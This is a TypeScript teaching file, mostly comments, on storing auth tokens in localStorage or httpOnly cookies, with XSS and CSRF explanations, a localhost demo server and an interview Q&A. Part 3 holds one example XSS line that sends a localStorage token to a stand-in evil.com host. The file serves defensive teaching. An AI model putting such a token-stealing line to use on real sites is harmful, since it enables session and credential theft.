// ─────────────────────────────────────────────────────────────────────────────
// LESSON 03 — COOKIES vs AUTHORIZATION HEADER (basic → advanced)
// Where should the client KEEP the token, and how should it SEND it?
// ─────────────────────────────────────────────────────────────────────────────
//
// This file is mostly explanation with small code examples. You can run it:
//   npx ts-node 03-cookies-vs-headers.ts
// It starts a tiny HTTP server on port 4000 that demonstrates both styles.
//
// ─────────────────────────────────────────────────────────────────────────────
// PART 1 — THE QUESTION (basic)
// ─────────────────────────────────────────────────────────────────────────────
//
// After login the server gives the browser a token. Two big decisions:
//   1. WHERE does the browser STORE it?  (localStorage? cookie?)
//   2. HOW is it SENT on each request?   (Authorization header? cookie?)
//
// The two common patterns:
//
//   PATTERN A — "Authorization header" (a.k.a. Bearer token)
//     - Server returns the token in the JSON response body.
//     - Frontend JS saves it (usually localStorage) and manually attaches it
//       to every request:   Authorization: Bearer eyJhbGci...
//
//   PATTERN B — "httpOnly cookie"
//     - Server sends the token in a Set-Cookie response header.
//     - The BROWSER stores it and automatically attaches it to every request
//       to that site. Frontend JS never touches it.
//
// ─────────────────────────────────────────────────────────────────────────────
// PART 2 — WHAT IS A COOKIE, REALLY? (basic)
// ─────────────────────────────────────────────────────────────────────────────
//
// A cookie is a small piece of text the server asks the browser to remember.
//
//   Server response:   Set-Cookie: token=abc123; HttpOnly; Secure
//   Browser, forever after (until expiry), on every request to that domain:
//                      Cookie: token=abc123
//
// Analogy: a hospital wristband. The hospital (server) puts it on you once.
// After that, every nurse (every request) sees it automatically — you don't
// have to remember to show it. And you can't easily hand it to someone else.
//
// Cookie attributes you MUST know:
//   HttpOnly  → JavaScript CANNOT read this cookie (document.cookie won't
//               show it). Only the browser's network layer uses it.
//   Secure    → only sent over HTTPS, never plain HTTP.
//   SameSite  → controls whether the cookie is sent on requests that START
//               from OTHER sites:
//                 Strict = never sent cross-site
//                 Lax    = sent on top-level navigation only (good default)
//                 None   = always sent (requires Secure) — needed if your
//                          frontend and API are on different domains
//   Max-Age / Expires → how long the browser keeps it.
//   Path      → which URLs receive it (e.g. Path=/auth/refresh means the
//               cookie is only attached to requests under /auth/refresh).
//
// ─────────────────────────────────────────────────────────────────────────────
// PART 3 — THE TWO ATTACKS: XSS vs CSRF (intermediate — THE interview part)
// ─────────────────────────────────────────────────────────────────────────────
//
// The whole cookies-vs-headers debate is really a trade-off between two
// attacks. Learn these two cold.
//
// ── XSS (Cross-Site Scripting) — "evil script runs ON your page" ──
//   The attacker manages to inject JavaScript into YOUR site (e.g. via an
//   unescaped comment field). That script runs with full power on your page.
//   Analogy: a burglar is INSIDE your house — he can open every drawer.
//
//   If token is in localStorage → the evil script does
//       fetch("https://evil.com/steal?t=" + localStorage.getItem("token"))
//     and the token is GONE. localStorage is a drawer any script can open.
//   If token is in an httpOnly cookie → the script CANNOT read it.
//       document.cookie shows nothing. ✅ httpOnly protects against theft.
//     (The script could still SEND requests as the user while the page is
//      open, but it can't exfiltrate the token for later use.)
//
// ── CSRF (Cross-Site Request Forgery) — "evil site makes your browser act" ──
//   You are logged in to bank.com (cookie stored). You visit evil.com, which
//   contains a hidden form that auto-submits to bank.com/transfer. The
//   browser HELPFULLY attaches your bank.com cookie — the transfer succeeds
//   even though evil.com never saw the cookie!
//   Analogy: someone forges your signature by tricking your own hand — the
//   browser signs (attaches the cookie) out of habit.
//
//   Cookies are vulnerable to CSRF exactly BECAUSE they are automatic.
//   Authorization headers are naturally IMMUNE to CSRF: evil.com's page
//   cannot read your localStorage (different origin) and therefore cannot
//   attach your header.
//
// ── THE TRADE-OFF TABLE (memorize) ──
//
//                       │ localStorage + header │ httpOnly cookie
//   ────────────────────┼───────────────────────┼──────────────────────────
//   XSS steals token?   │ ❌ YES — fatal        │ ✅ NO (JS can't read it)
//   CSRF possible?      │ ✅ NO (not automatic) │ ❌ YES — needs defenses
//   Effort in frontend  │ manual attach         │ zero — browser does it
//   Works for mobile/CLI│ ✅ easy               │ awkward
//
// ── CSRF DEFENSES (so cookies become safe) ──
//   1. SameSite=Lax or Strict on the cookie — the modern default fix; the
//      browser simply refuses to attach the cookie to cross-site requests.
//   2. CSRF tokens — server puts a random value in the page; every form/AJAX
//      call must echo it back; evil.com can't read it so it can't fake it.
//   3. Check Origin/Referer headers server-side.
//   4. Never perform state changes on GET requests.
//
// VERDICT most teams use today: httpOnly + Secure + SameSite cookie for the
// refresh token (long-lived, most valuable), and keep the short-lived access
// token in JS memory (a variable — wiped on tab close, hard to steal in bulk).
// You'll build exactly this in the day 7 project.
//
// ─────────────────────────────────────────────────────────────────────────────
// PART 4 — RUNNABLE DEMO
// ─────────────────────────────────────────────────────────────────────────────
// A tiny raw-Node server showing both patterns side by side.
// Run it, then try:
//   curl -i http://localhost:4000/login-cookie
//   curl -i http://localhost:4000/login-header
//   curl -i http://localhost:4000/me-cookie --cookie "token=demo-token-123"
//   curl -i http://localhost:4000/me-header -H "Authorization: Bearer demo-token-123"

import http from "http";

const server = http.createServer((req, res) => {
  // PATTERN B: server sets an httpOnly cookie. Note the attributes.
  if (req.url === "/login-cookie") {
    res.setHeader(
      "Set-Cookie",
      "token=demo-token-123; HttpOnly; SameSite=Lax; Max-Age=900; Path=/"
      // In production add "; Secure" — omitted here so plain http works.
    );
    res.end("Cookie set! The browser will now send it automatically.\n");
    return;
  }

  // PATTERN A: server returns the token in the body; client must store it.
  if (req.url === "/login-header") {
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify({ accessToken: "demo-token-123" }) + "\n");
    return;
  }

  // Reading the cookie: it arrives in the "Cookie" request header.
  if (req.url === "/me-cookie") {
    const cookies = req.headers.cookie ?? "";
    const ok = cookies.includes("token=demo-token-123");
    res.end(ok ? "✅ authenticated via cookie\n" : "❌ no valid cookie\n");
    return;
  }

  // Reading the Authorization header: "Bearer <token>".
  if (req.url === "/me-header") {
    const auth = req.headers.authorization ?? "";
    const ok = auth === "Bearer demo-token-123";
    res.end(ok ? "✅ authenticated via header\n" : "❌ no valid header\n");
    return;
  }

  res.statusCode = 404;
  res.end("not found\n");
});

server.listen(4000, () => {
  console.log("Demo server on http://localhost:4000 — press Ctrl+C to stop");
  console.log("Try the curl commands listed in the comments above.");
});

// ─────────────────────────────────────────────────────────────────────────────
// INTERVIEW Q&A CHEAT SHEET
// ─────────────────────────────────────────────────────────────────────────────
//
// Q1: Where should you store a JWT on the client — localStorage or cookie?
// A1: There is no perfect answer; it's an XSS-vs-CSRF trade-off.
//     localStorage is readable by any script → XSS steals the token.
//     Cookies are attached automatically → CSRF risk, but httpOnly + Secure
//     + SameSite mitigates both well. Common best practice: refresh token in
//     an httpOnly cookie, access token in JS memory only.
//
// Q2: What does httpOnly do?
// A2: Marks a cookie unreadable by JavaScript (document.cookie hides it).
//     Only the browser's network layer sends it. This prevents XSS scripts
//     from stealing the cookie's value.
//
// Q3: What is XSS?
// A3: Cross-Site Scripting: attacker injects JavaScript into your page (e.g.
//     via unescaped user input). The script runs with full access to the DOM,
//     localStorage, and can make requests as the user. Defense: escape/
//     sanitize output, Content-Security-Policy, httpOnly cookies.
//
// Q4: What is CSRF?
// A4: Cross-Site Request Forgery: an evil site triggers a request to YOUR
//     site from the victim's browser, which auto-attaches the victim's
//     cookies, so the action executes as the victim. Works only against
//     cookie-based auth because cookies are sent automatically.
//
// Q5: How do you prevent CSRF?
// A5: SameSite=Lax/Strict cookies (modern default), CSRF tokens that the
//     attacker's page cannot read, Origin/Referer checking, and never
//     changing state on GET requests.
//
// Q6: Why is Authorization-header auth immune to CSRF?
// A6: Because the header is attached manually by your JavaScript. An
//     attacker's page on another origin cannot read your storage or set
//     your header, so it can't forge an authenticated request.
//
// Q7: What do Secure and SameSite do on a cookie?
// A7: Secure = cookie only sent over HTTPS. SameSite controls cross-site
//     sending: Strict (never), Lax (top-level navigation only), None
//     (always; requires Secure).
//
// Q8: Frontend on app.com, API on api.com — what changes for cookies?
// A8: That's a cross-site setup: the cookie needs SameSite=None; Secure,
//     the API must send proper CORS headers, and fetch must use
//     credentials: "include". Many teams avoid this by serving both from
//     one domain or using subdomains.
//
// Q9: Is sessionStorage safer than localStorage for tokens?
// A9: Barely. It's cleared when the tab closes, which shrinks the exposure
//     window, but any XSS script can still read it. It does not solve the
//     fundamental problem.
//
// Q10: What is the "Bearer" in "Authorization: Bearer <token>"?
// A10: A standard auth scheme meaning "whoever BEARS (carries) this token is
//      authorized" — no further proof of identity is required. That's also
//      why bearer tokens must be protected like passwords.
// ─────────────────────────────────────────────────────────────────────────────
